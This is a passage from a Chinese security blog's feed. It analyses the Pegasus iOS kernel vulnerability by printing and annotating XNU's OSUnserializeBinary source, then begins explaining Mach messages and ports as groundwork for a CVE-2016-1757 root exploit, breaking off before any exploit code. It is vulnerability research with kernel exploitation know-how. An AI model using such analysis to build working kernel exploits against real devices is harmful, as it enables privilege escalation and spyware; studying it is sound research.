class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */</span><br><span class="line"></span><br><span class="line">#define setAtIndex(v, idx, o)													\</span><br><span class="line">	if (idx &gt;= v##Capacity)														\</span><br><span class="line">	&#123;																			\</span><br><span class="line">		uint32_t ncap = v##Capacity + 64;										\</span><br><span class="line">		typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));	\</span><br><span class="line">		if (!nbuf) ok = false;													\</span><br><span class="line">		if (v##Array)															\</span><br><span class="line">		&#123;																		\</span><br><span class="line">			bcopy(v##Array, nbuf, v##Capacity * sizeof(o));						\</span><br><span class="line">			kfree(v##Array, v##Capacity * sizeof(o));							\</span><br><span class="line">		&#125;																		\</span><br><span class="line">		v##Array    = nbuf;														\</span><br><span class="line">		v##Capacity = ncap;														\</span><br><span class="line">	&#125;																			\</span><br><span class="line">	if (ok) v##Array[idx] = o;</span><br><span class="line"></span><br><span class="line">/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */</span><br><span class="line"></span><br><span class="line">OSObject *</span><br><span class="line">OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)</span><br><span class="line">&#123;</span><br><span class="line">	OSObject ** objsArray;</span><br><span class="line">	uint32_t    objsCapacity;</span><br><span class="line">	uint32_t    objsIdx;</span><br><span class="line"></span><br><span class="line">	OSObject ** stackArray;</span><br><span class="line">	uint32_t    stackCapacity;</span><br><span class="line">	uint32_t    stackIdx;</span><br><span class="line"></span><br><span class="line">    OSObject     * result;</span><br><span class="line">    OSObject     * parent;</span><br><span class="line">    OSDictionary * dict;</span><br><span class="line">    OSArray      * array;</span><br><span class="line">    OSSet        * set;</span><br><span class="line">    OSDictionary * newDict;</span><br><span class="line">    OSArray      * newArray;</span><br><span class="line">    OSSet        * newSet;</span><br><span class="line">    OSObject     * o;</span><br><span class="line">    OSSymbol     * sym;</span><br><span class="line">    OSString     * str;</span><br><span class="line"></span><br><span class="line">    size_t           bufferPos;</span><br><span class="line">    const uint32_t * next;</span><br><span class="line">    uint32_t         key, len, wordLen;</span><br><span class="line">    bool             end, newCollect, isRef;</span><br><span class="line">    unsigned long long value;</span><br><span class="line">    bool ok;</span><br><span class="line"></span><br><span class="line">	if (errorString) *errorString = 0;</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	#define kOSSerializeBinarySignature "\323\0\0"</span><br><span class="line">	*/</span><br><span class="line">	// 检测是否是是具有签名的内存数据</span><br><span class="line">	if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);</span><br><span class="line">	// 0000 0011 &amp;&amp; buffer指针 ==》buffer的地址末尾不能是11</span><br><span class="line">	if (3 &amp; ((uintptr_t) buffer)) return (NULL);</span><br><span class="line">	// 检测buffersize的大小要小于kOSSerializeBinarySignature的大小</span><br><span class="line">	if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);</span><br><span class="line">	// 跳过内存开始的签名部分，获取第一个需要解析的内存</span><br><span class="line">	bufferPos = sizeof(kOSSerializeBinarySignature);</span><br><span class="line">	next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);</span><br><span class="line"></span><br><span class="line">	DEBG("---------OSUnserializeBinary(%p)\n", buffer);</span><br><span class="line"></span><br><span class="line">	objsArray = stackArray    = NULL;</span><br><span class="line">	objsIdx   = objsCapacity  = 0;</span><br><span class="line">	stackIdx  = stackCapacity = 0;</span><br><span class="line"></span><br><span class="line">    result   = 0;</span><br><span class="line">    parent   = 0;</span><br><span class="line">	dict     = 0;</span><br><span class="line">	array    = 0;</span><br><span class="line">	set      = 0;</span><br><span class="line">	sym      = 0;</span><br><span class="line"></span><br><span class="line">	ok = true;</span><br><span class="line">	while (ok)</span><br><span class="line">	&#123;</span><br><span class="line">		// 通过next指向的内容获取当前的key的pos</span><br><span class="line">		bufferPos += sizeof(*next);</span><br><span class="line">		// 检测是否分析完成</span><br><span class="line">		if (!(ok = (bufferPos &lt;= bufferSize))) break;</span><br><span class="line">		// 获取当前的key</span><br><span class="line">		key = *next++;</span><br><span class="line"></span><br><span class="line">        len = (key &amp; kOSSerializeDataMask);</span><br><span class="line">        wordLen = (len + 3) &gt;&gt; 2; //计算要用几个word</span><br><span class="line">		end = (0 != (kOSSerializeEndCollecton &amp; key));</span><br><span class="line">        DEBG("key 0x%08x: 0x%04x, %d\n", key, len, end);</span><br><span class="line"></span><br><span class="line">        newCollect = isRef = false;</span><br><span class="line">		o = 0; newDict = 0; newArray = 0; newSet = 0;</span><br><span class="line">		</span><br><span class="line">		//根据key的不同对不同的数据结构做操作</span><br><span class="line">		switch (kOSSerializeTypeMask &amp; key)</span><br><span class="line">		&#123;</span><br><span class="line">		    case kOSSerializeDictionary:</span><br><span class="line">				o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeArray:</span><br><span class="line">				o = newArray = OSArray::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeSet:</span><br><span class="line">				o = newSet = OSSet::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeObject:</span><br><span class="line">				if (len &gt;= objsIdx) break;</span><br><span class="line">				o = objsArray[len];</span><br><span class="line">				o-&gt;retain();</span><br><span class="line">				isRef = true;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeNumber:</span><br><span class="line">				bufferPos += sizeof(long long);</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		    	value = next[1];</span><br><span class="line">		    	value &lt;&lt;= 32;</span><br><span class="line">		    	value |= next[0];</span><br><span class="line">		    	o = OSNumber::withNumber(value, len);</span><br><span class="line">		    	next += 2;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeSymbol:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize)           break;</span><br><span class="line">				if (0 != ((const char *)next)[len-1]) break;</span><br><span class="line">		        o = (OSObject *) OSSymbol::withCString((const char *) next);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeString:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSString::withStringOfLength((const char *) next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">    	    case kOSSerializeData:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSData::withBytes(next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">    	    case kOSSerializeBoolean:</span><br><span class="line">				o = (len ? kOSBooleanTrue : kOSBooleanFalse);</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    default:</span><br><span class="line">		        break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//退出循环</span><br><span class="line">		if (!(ok = (o != 0))) break;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		//如果反序列化的结果不是一个reference</span><br><span class="line">		//就将结果存放到objsCapacity之中</span><br><span class="line">		//如果反序列化自后内存申请失败,则退出反序列化</span><br><span class="line">		if (!isRef)</span><br><span class="line">		&#123;</span><br><span class="line">			setAtIndex(objs, objsIdx, o);</span><br><span class="line">			//如果ok的值为false，则退出反序列化循环</span><br><span class="line">			</span><br><span class="line">			//	#define kalloc_container(size)	\</span><br><span class="line">					kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">			/*</span><br><span class="line">				typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">				if (!nbuf) ok = false;</span><br><span class="line">			*/</span><br><span class="line">			</span><br><span class="line">			//在内核中申请ncap*sizeof（o）大小的内存，如果申请失败的了则ok设为false</span><br><span class="line">			if (!ok) &#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			objsIdx++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//如果存在一个解析出来的dict</span><br><span class="line">		if (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			if (sym)</span><br><span class="line">			&#123;</span><br><span class="line">				DEBG("%s = %s\n", sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				if (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();</span><br><span class="line">				sym-&gt;release();</span><br><span class="line">				sym = 0;</span><br><span class="line">			&#125;</span><br><span class="line">			else </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">				if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = 0;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != 0);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else if (array) </span><br><span class="line">		&#123;</span><br><span class="line">			ok = array-&gt;setObject(o);</span><br><span class="line">		    o-&gt;release();</span><br><span class="line">		&#125;</span><br><span class="line">		else if (set)</span><br><span class="line">		&#123;</span><br><span class="line">		   ok = set-&gt;setObject(o);</span><br><span class="line">		   o-&gt;release();</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">		    assert(!parent);</span><br><span class="line">		    result = o;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (!ok) break;</span><br><span class="line"></span><br><span class="line">		if (newCollect)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!end)</span><br><span class="line">			&#123;</span><br><span class="line">				stackIdx++;</span><br><span class="line">				setAtIndex(stack, stackIdx, parent);</span><br><span class="line">				if (!ok) break;</span><br><span class="line">			&#125;</span><br><span class="line">			DEBG("++stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			parent = o;</span><br><span class="line">			dict   = newDict;</span><br><span class="line">			array  = newArray;</span><br><span class="line">			set    = newSet;</span><br><span class="line">			end    = false;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (end)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!stackIdx) break;</span><br><span class="line">			parent = stackArray[stackIdx];</span><br><span class="line">			DEBG("--stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			stackIdx--;</span><br><span class="line">			set   = 0; </span><br><span class="line">			dict  = 0; </span><br><span class="line">			array = 0;</span><br><span class="line">			if (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">			&#123;</span><br><span class="line">				if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG("ret %p\n", result);</span><br><span class="line"></span><br><span class="line">	if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));</span><br><span class="line">	if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));</span><br><span class="line"></span><br><span class="line">	if (!ok &amp;&amp; result)</span><br><span class="line">	&#123;</span><br><span class="line">		result-&gt;release();</span><br><span class="line">		result = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	return (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p> <a href="http://blog.pangu.io/pegasus-apt/">Pegasus – 针对iOS设备的APT攻击分析- PanguTeam</a></p>
<p> <a href="http://www.freebuf.com/articles/terminal/113128.html">iOS“远程越狱”间谍软件Pegasus技术分析</a></p>
<p>关心<code>IOS</code>安全的技术人员最近一定都关注了这一次的安全事件，不需要多做描述了，想了解具体细节的可以自行<code>google</code>。</p>
<p>本文内容</p>
<ul>
<li>了漏洞所在的函数<code>OSUnserializeBinary</code>，了解其二进制格式</li>
<li>理解<code>POC</code>，分析<code>POC</code>执行的流程</li>
</ul>
<p>具体的技术背景，可以参考下面这篇文章</p>
<p><a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html">PEGASUS iOS Kernel Vulnerability Explained</a></p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html">PEGASUS iOS Kernel Vulnerability Explained - Part 2</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2996.html">iOS三叉戟漏洞补丁分析、利用代码 公布（POC）</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="IOS" scheme="http://turingh.github.io/tags/IOS/"/>
    
      <category term="POC" scheme="http://turingh.github.io/tags/POC/"/>
    
      <category term="Pegasus" scheme="http://turingh.github.io/tags/Pegasus/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[再看CVE-2016-1757---浅析mach message的使用]]></title>
    <link href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://turingh.github.io/2016/07/05/再看CVE-2016-1757浅析mach message的使用/</id>
    <published>2016-07-06T00:55:33.000Z</published>
    <updated>2016-07-06T06:16:13.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1757" target="_blank" rel="external">CVE-2016-1757</a>是一个<code>OS X</code>系统上通过条件竞争实现任意代码在<code>root</code>权限执行的漏洞。在这篇文章之前，我已经分析过了这个漏洞的原理，以及<code>EXP</code>代码的实现。</p>
<p><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757简单分析</a></p>
<p><a href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">CVE-2016-1757利用程序分析</a></p>
<p><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a></p>
<p>在<code>syscan2016</code>上又有国外的安全研究人员放出自己的<a href="https://github.com/gdbinit/mach_race" target="_blank" rel="external">利用代码</a>。学习之后，这个利用代码确实比之前的更加清晰、明确。更加容易理解。</p>
<p>而两个利用本质上面的不同是对<code>mach port</code>的不同的利用方法。下面主要结合两个不同的POC，来分析一下<code>mach message</code>的使用，同时也是研究<code>xnu</code>的<code>IPC</code>的基础。</p>
<a id="more"></a>
<h1 id="0x01_Mach">0x01 Mach</h1><p><code>Mach</code>在<code>OS X</code>的内核中处于最接近底层的一个模块。是<code>XNU</code>内核的内核。是一个<code>BSD</code>层包裹的<code>微内核</code>。而内核中的<code>task</code>,<code>thread</code>,<code>virtual memory</code>等模块，对于<code>Mach</code>来说，都是一个<code>Object</code>。这些<code>Objects</code>基于<code>Mach</code>实现自己的功能，并且通过<code>Mach Message</code>来进行相互之间的通信。</p>
<blockquote>
<p>The Mach kernel thus becomes a low-level foundation, concerning itself with only the bare mini-mum required for driving the operating system. Everything else may be implemented by some higher    layer of an operating system, which then draws on the Mach primitives and manipulate them inwhatever way it sees fit.                                        </p>
<p>​                                                                                                           ——–Mac OS® X and iOS Internals    </p>
</blockquote>
<h2 id="1-1_Mach_Messages">1.1 Mach Messages</h2><p><code>Mach Messages</code>总共有两种，分别是<code>Simple Messages</code>和<code>Complex Messages</code>。</p>
<h3 id="1-1-1_Simple_Message">1.1.1 Simple Message</h3><p><code>Simple Message</code>的结构体，大致如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/simple_message.png?1" alt="simple message"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">natural_t</span>			pad1;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>		pad2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>			pad3 : <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</span><br><span class="line">&#125; <span class="keyword">mach_msg_type_descriptor_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="keyword">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="keyword">struct</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">mach_msg_bits_t</span>	msgh_bits;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>	msgh_size;</span><br><span class="line">  <span class="keyword">mach_port_t</span>		msgh_remote_port;</span><br><span class="line">  <span class="keyword">mach_port_t</span>		msgh_local_port;</span><br><span class="line">  <span class="keyword">mach_port_name_t</span>	msgh_voucher_port;</span><br><span class="line">  <span class="keyword">mach_msg_id_t</span>		msgh_id;</span><br><span class="line">&#125; <span class="keyword">mach_msg_header_t</span>;</span><br></pre></td></tr></table></figure>
<p>在使用<code>mach message</code>时,可以自己定义一个数据结构，更方便的编写代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">    <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">    <span class="keyword">mach_msg_type_descriptor_t</span> type;</span><br><span class="line">&#125; message;</span><br><span class="line"></span><br><span class="line">message.header = (<span class="keyword">mach_msg_header_t</span>) &#123;</span><br><span class="line">    .msgh_remote_port = port,</span><br><span class="line">    .msgh_local_port = MACH_PORT_NULL,</span><br><span class="line">    .msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, <span class="number">0</span>),</span><br><span class="line">    .msgh_size = <span class="keyword">sizeof</span>(message)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">message.body = (<span class="keyword">mach_msg_body_t</span>) &#123;</span><br><span class="line">    .msgh_descriptor_count = <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">message.type = (<span class="keyword">mach_msg_type_descriptor_t</span>) &#123;</span><br><span class="line">    .pad1 = data,</span><br><span class="line">    .pad2 = <span class="keyword">sizeof</span>(data)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>构建一个<code>message</code>，然后调用<code>mach API</code>发送这个消息。当然<code>msgh_descriptor_count</code>也可以是其他值，那么就要有相对于个数的<code>mach_msg_type_descriptor_t</code>。</p>
<h3 id="1-1-2_Complex_Messages">1.1.2 Complex Messages</h3><p><code>Complex Messages</code>和<code>Simple Message</code>对比，多了一个附加的数据<code>Mach Trailers</code>。并且数据描述符的定义也不同了。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/complex_message.png?1" alt="complex message"></p>
<p>描述符的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span>*				address;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> !defined(__LP64__)</span></span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">boolean_t</span>     		deallocate: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">mach_msg_copy_options_t</span>       copy: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     		pad1: <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>    type: <span class="number">8</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__LP64__)</span></span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>       	size;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">mach_msg_ool_descriptor_t</span>;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_ports">1.2 ports</h2><h3 id="1-2-1_port_的权限">1.2.1 port 的权限</h3><p>每一条<code>Mach Message</code>都是从一个<code>port</code>发送到另外一个<code>port</code>，而每一个<code>port</code>都有自己的权限。</p>
<ul>
<li>SEND：将<code>Mach Message</code>添加到<code>port</code>的队列中。</li>
<li>RECIVE：允许从队列中读取<code>Mach Message</code>。一般情况下只有<code>port</code>的持有者拥有这个权利。</li>
</ul>
<p><code>port</code>以及他的<code>权限</code>，可以从一个进程转交给另外一个进程，这也就是这一次要分析的<code>EXP</code>的主要原理。</p>
<h3 id="1-2-2_一些特殊的port">1.2.2 一些特殊的port</h3><p>当每一个<code>task</code>被创建的时候，系统都会提供一系列特殊的<code>port</code>，在这些<code>port</code>当中，我们比较感兴趣的是以下几种：</p>
<ul>
<li>host port：代表正在运行该<code>task</code>的整台机器的<code>port</code>。</li>
<li>task port: 正在运行的<code>task</code>本身的<code>port</code>。</li>
<li>bootstrap port : 和<code>bootstrap server</code>连接着的一个<code>port</code>。</li>
</ul>
<h2 id="1-3_Send&amp;Recv_Messages">1.3 Send&amp;Recv Messages</h2><p><code>Message</code>的发送与接收，都是使用同一个<code>mach API</code>，<code>mach_msg</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kr = mach_msg(recv_hdr,              <span class="comment">// message buffer</span></span><br><span class="line">              msg_options,          <span class="comment">// option indicating receive</span></span><br><span class="line">              <span class="number">0</span>,                     <span class="comment">// send size</span></span><br><span class="line">              recv_hdr-&gt;msgh_size,   <span class="comment">// size of header + body</span></span><br><span class="line">              server_port,           <span class="comment">// receive name</span></span><br><span class="line">              MACH_MSG_TIMEOUT_NONE, <span class="comment">// no timeout, wait forever</span></span><br><span class="line">              MACH_PORT_NULL);       <span class="comment">// no notification port</span></span><br><span class="line"></span><br><span class="line">kr = mach_msg(send_hdr,              <span class="comment">// message buffer</span></span><br><span class="line">              MACH_SEND_MSG,         <span class="comment">// option indicating send</span></span><br><span class="line">              send_hdr-&gt;msgh_size,   <span class="comment">// size of header + body</span></span><br><span class="line">              <span class="number">0</span>,                     <span class="comment">// receive limit</span></span><br><span class="line">              MACH_PORT_NULL,        <span class="comment">// receive name</span></span><br><span class="line">              MACH_MSG_TIMEOUT_NONE, <span class="comment">// no timeout, wait forever</span></span><br><span class="line">              MACH_PORT_NULL);       <span class="comment">// no notification port</span></span><br></pre></td></tr></table></figure>
<p>根据参数的不同，实现了接收<code>Message</code>和发送<code>Message</code>不同的功能。</p>
<p>通过对源码的阅读，<code>mach_msg</code>实际上是调用了<code>mach_msg_overwrite_trap</code>，进入内核中，通过<code>ipc_kmsg_*</code>系列函数，来实现的消息发送与接收。大致如下图所示。</p>
<p><img src="http://blog.ibireme.com/wp-content/uploads/2015/05/RunLoop_5.png" alt=""></p>
<p>图片转自(<a href="http://blog.ibireme.com/2015/05/18/runloop/)。" target="_blank" rel="external">http://blog.ibireme.com/2015/05/18/runloop/)。</a></p>
<h2 id="0x02_The_Port_Swap_Dance">0x02 The Port Swap Dance</h2><p>了解了<code>port</code>和<code>Mach Message</code>的基础知识之后，先来回顾一下我们已经<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=226154" target="_blank" rel="external">分析过的EXP中</a>，有这样一段代码。</p>
